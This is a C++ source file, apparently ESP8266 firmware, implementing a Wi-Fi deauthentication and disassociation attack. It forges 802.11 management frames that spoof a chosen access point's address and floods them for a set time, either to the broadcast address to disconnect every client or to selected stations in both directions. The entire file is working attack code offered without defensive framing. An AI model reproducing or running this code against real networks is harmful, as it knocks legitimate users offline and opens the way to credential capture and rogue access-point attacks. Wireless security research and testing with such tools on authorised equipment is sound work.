#include"DEAUTH_DISAS.h"
DEAUTH_DISAS::DEAUTH_DISAS() {
}
void DEAUTH_DISAS::set(MAC to, MAC from, uint8_t fc) {
  /* change Destination address */
  /* 4 - 9 */
  for (int i = 0; i < 6; i++) {
    packet[4 + i] = to._get(i);
  }

  /* change Source address & BSSID */
  for (int i = 0; i < 6; i++) {
    packet[10 + i] = packet[16 + i] = from._get(i);
  }

  /* change Frame control field */

  /* 0 */ packet[0] = fc;
}
bool DEAUTH_DISAS::send() {
  wifi_send_pkt_freedom(packet, 26, 0);
  wifi_send_pkt_freedom(packet, 26, 0);
}
void DEAUTH_DISAS::attack(int timeout, uint8_t fc, int all) {
  MAC from, to;
  int curTime = millis();
  int channel = 6;
  if (scan.numOfAPSelected() == 1) {
    for (int i = 0; i < scan.numOfNetwork && i < scan.maxNumOfNetwork; i++) {
      if (scan.getSelected(i) == true) {
        from = scan.bssid._get(i);
        channel = scan.getChannel(i);
        break;
      }
    }
    if (all == 1) {
      to = MAC(0xff,0xff,0xff,0xff,0xff,0xff);
      while (millis() - curTime <= timeout * 1000) {
        set(to, from, fc);
        send();
        delay(1);
      }
    }
    else {
      while (millis() - curTime <= timeout * 1000) {
        for (int i = 0; i < mon.numOfKnownStation; i++) {
          if (mon.getSelected(i) == true) {
            to = mon.stationList._get(i);
            set(to, from, fc);
            send();
            delay(1);
            set(from, to, fc);
            send();
            delay(1);
          }
        }
      }
    }
  }
  Serial.println("RS_DE_DIS_AT");
}

